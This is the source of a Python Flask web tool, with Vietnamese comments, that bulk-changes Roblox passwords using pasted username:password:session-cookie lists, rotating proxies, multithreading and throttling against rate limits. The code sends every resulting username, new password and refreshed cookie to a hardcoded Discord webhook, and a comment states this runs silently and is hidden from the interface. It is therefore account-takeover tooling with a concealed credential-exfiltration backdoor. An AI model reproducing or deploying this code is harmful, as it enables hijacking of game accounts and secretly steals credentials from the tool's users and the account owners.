import io
import json
import queue
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests
from flask import Flask, Response, render_template, request, stream_with_context

app = Flask(__name__)

# Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353316328611880/KZHZScqvXJv4M32QOqyocRuvq-jRIq-sQ9ISPrZahlx6dzjr8J-aV0jZ5IsphmtIKNzT"
PING_EVERYONE = True

DEFAULT_USER_AGENT = (
    "Roblox/2.624.577 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
)


def send_result_to_webhook_silent(content: str, ok_count: int, total_count: int) -> None:
    url = (DISCORD_WEBHOOK_URL or "").strip()
    if not url or not content.strip():
        return

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"roblox_changed_{ts}.txt"
    prefix_ping = "@everyone " if PING_EVERYONE else ""
    payload = {
        "content": f"{prefix_ping}Changepass hoàn tất: **{ok_count}/{total_count}** acc thành công.",
        "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
    }
    files = {
        "files[0]": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
    }
    try:
        resp = requests.post(
            url,
            data={"payload_json": json.dumps(payload, ensure_ascii=False)},
            files=files,
            timeout=20,
        )
        if resp.status_code not in (200, 204):
            # Fallback chuẩn `file` nếu endpoint/proxy không nhận `files[0]`
            requests.post(
                url,
                data={
                    "content": payload["content"],
                    "allowed_mentions": json.dumps(payload["allowed_mentions"]),
                },
                files={"file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain")},
                timeout=20,
            )
    except Exception:
        pass


def get_csrf_token(session, headers):
    try:
        response = session.post("https://auth.roblox.com/v2/logout", headers=headers, timeout=15)
        return response.headers.get("x-csrf-token")
    except Exception:
        return None


def refresh_cookie(session, headers, csrf_token):
    headers_with_csrf = headers.copy()
    headers_with_csrf.update({
        "X-CSRF-TOKEN": csrf_token,
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/home",
        "Accept": "application/json",
        "Content-Type": "application/json",
    })
    try:
        logout_response = session.post(
            "https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate",
            headers=headers_with_csrf,
            json={"clientId": ""},
            timeout=15,
        )
        if logout_response.status_code == 200 and ".ROBLOSECURITY" in logout_response.cookies:
            return logout_response.cookies[".ROBLOSECURITY"]
        return None
    except Exception:
        return None


def change_password(cookie, current_password, new_password, user_agent=DEFAULT_USER_AGENT, proxy_config=None):
    try:
        headers = {
            "Cookie": f".ROBLOSECURITY={cookie}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": user_agent,
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/my/account#!/info",
            "RBXAuthenticationNegotiation": "1",
            "X-CSRF-TOKEN": "",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

        session = requests.Session()
        if proxy_config:
            session.proxies.update(proxy_config)

        session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
        time.sleep(random.uniform(0.1, 0.3))

        csrf_token = get_csrf_token(session, headers)
        if not csrf_token:
            return False, "Failed to get CSRF token"

        headers["X-CSRF-TOKEN"] = csrf_token
        data = {
            "currentPassword": current_password,
            "newPassword": new_password,
        }

        r = session.post(
            "https://auth.roblox.com/v2/user/passwords/change",
            headers=headers,
            json=data,
            timeout=20,
        )

        if r.status_code == 200:
            new_cookie_from_change = None
            for cookie_obj in r.cookies:
                if cookie_obj.name == ".ROBLOSECURITY":
                    new_cookie_from_change = cookie_obj.value
                    break

            cookie_to_refresh = new_cookie_from_change if new_cookie_from_change else cookie

            refresh_session = requests.Session()
            if proxy_config:
                refresh_session.proxies.update(proxy_config)
            refresh_session.cookies.set(".ROBLOSECURITY", cookie_to_refresh, domain=".roblox.com")

            refresh_headers = headers.copy()
            refresh_headers["Cookie"] = f".ROBLOSECURITY={cookie_to_refresh}"

            time.sleep(0.2)
            refreshed_cookie = refresh_cookie(refresh_session, refresh_headers, csrf_token)
            return True, (refreshed_cookie if refreshed_cookie else cookie_to_refresh)

        elif r.status_code == 429:
            time.sleep(random.uniform(2, 4))
            return False, "Rate limited (429)"

        elif r.status_code == 403:
            try:
                error_data = r.json()
                error_msg = error_data.get("errors", [{}])[0].get("message", "")
                if "Challenge is required" in error_msg:
                    return False, "Challenge required - cannot bypass"
                return False, f"403: {error_msg}"
            except Exception:
                return False, "403 - Invalid current password or cookie"
        else:
            try:
                error_data = r.json()
                error_msg = error_data.get("errors", [{}])[0].get("message", f"HTTP {r.status_code}")
                return False, f"Error: {error_msg}"
            except Exception:
                return False, f"Error: Status code {r.status_code}"

    except Exception as e:
        return False, f"Connection Error: {str(e)}"


def generate_password(custom_password=None, prefix="TD"):
    if custom_password:
        return custom_password
    base_length = 11
    num_digits = max(4, base_length - len(prefix))
    random_num = "".join([str(random.randint(0, 9)) for _ in range(num_digits)])
    return f"{prefix}{random_num}"


def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if "@" in proxy_str:
        auth_part, server_part = proxy_str.split("@", 1)
        if ":" not in auth_part or ":" not in server_part:
            return None
        proxy_user, proxy_pass = auth_part.split(":", 1)
        host, port = server_part.split(":", 1)
        url = f"http://{proxy_user}:{proxy_pass}@{host}:{port}"
        return {"http": url, "https": url}
    else:
        parts = proxy_str.split(":")
        if len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
            return {"http": url, "https": url}
        elif len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            return {"http": url, "https": url}
    return None


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/process", methods=["POST"])
def process_accounts():
    payload = request.get_json(force=True)
    raw_accounts = payload.get("accounts", "")
    raw_proxies = payload.get("proxies", "")
    mode = payload.get("mode", "proxy")
    pass_mode = payload.get("passMode", "random")
    prefix = (payload.get("prefix") or "TD").strip()
    custom_password = (payload.get("customPassword") or "").strip() if pass_mode == "custom" else None
    threads = max(1, min(50, int(payload.get("threads", 10))))

    accounts = []
    for line in raw_accounts.splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            parts = line.split(":", 2)
            if len(parts) == 3:
                accounts.append({
                    "username": parts[0].strip(),
                    "password": parts[1].strip(),
                    "cookie": parts[2].strip(),
                })

    proxies = [p.strip() for p in raw_proxies.splitlines() if p.strip() and not p.strip().startswith("#")]

    def event_stream():
        if not accounts:
            yield f"data: {json.dumps({'type': 'error', 'msg': 'Không tìm thấy account hợp lệ (user:pass:cookie)'})}\n\n"
            return

        if mode == "proxy" and not proxies:
            yield f"data: {json.dumps({'type': 'error', 'msg': 'Chế độ Proxy yêu cầu ít nhất 1 proxy!'})}\n\n"
            return

        q = queue.Queue()
        total = len(accounts)
        success_lines = []
        state_lock = threading.Lock()

        def push(event_type, **kwargs):
            kwargs["type"] = event_type
            kwargs["time"] = datetime.now().strftime("%H:%M:%S")
            q.put(kwargs)

        def worker_task(acc, proxy_str=None):
            username = acc["username"]
            curr_pass = acc["password"]
            cookie = acc["cookie"]
            proxy_cfg = parse_proxy(proxy_str) if proxy_str else None

            if proxy_str and not proxy_cfg:
                push("fail", username=username, msg="Sai định dạng proxy")
                return

            new_pass = generate_password(custom_password, prefix)
            push("log", msg=f"Đang xử lý: {username}")

            success, result = change_password(cookie, curr_pass, new_pass, DEFAULT_USER_AGENT, proxy_cfg)
            if not success:
                push("log", msg=f"Thử lại lần 2 cho {username}...")
                time.sleep(0.3)
                success, result = change_password(cookie, curr_pass, new_pass, DEFAULT_USER_AGENT, proxy_cfg)

            if success:
                line_out = f"{username}:{new_pass}:{result}"
                with state_lock:
                    success_lines.append(line_out)
                push("success", username=username, line=line_out, msg=f"Đổi pass thành công -> {new_pass}")
            else:
                push("fail", username=username, line=f"{username}:{curr_pass}:{cookie} | {result}", msg=result)

        def runner():
            push("start", total=total)
            if mode == "delay":
                batch_size = 5
                for i in range(0, total, batch_size):
                    batch = accounts[i : i + batch_size]
                    push("log", msg=f"Batch {i // batch_size + 1} ({len(batch)} acc)")
                    for acc in batch:
                        worker_task(acc, None)
                    if i + batch_size < total:
                        push("log", msg="Chờ 30s chống rate-limit...")
                        time.sleep(30)
            else:
                max_workers = min(threads, total)
                push("log", msg=f"Chạy đa luồng: {max_workers} threads | {len(proxies)} proxies")
                with ThreadPoolExecutor(max_workers=max_workers) as executor:
                    futures = []
                    for idx, acc in enumerate(accounts):
                        px = proxies[idx % len(proxies)]
                        futures.append(executor.submit(worker_task, acc, px))
                    for f in as_completed(futures):
                        try:
                            f.result()
                        except Exception as e:
                            push("log", msg=f"Thread error: {e}")

            with state_lock:
                joined_ok = "\n".join(success_lines)
                ok_total = len(success_lines)

            send_result_to_webhook_silent(joined_ok, ok_total, total)
            push("done")

        threading.Thread(target=runner, daemon=True).start()

        while True:
            item = q.get()
            yield f"data: {json.dumps(item)}\n\n"
            if item.get("type") in ("done", "error"):
                break

    return Response(stream_with_context(event_stream()), mimetype="text/event-stream")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
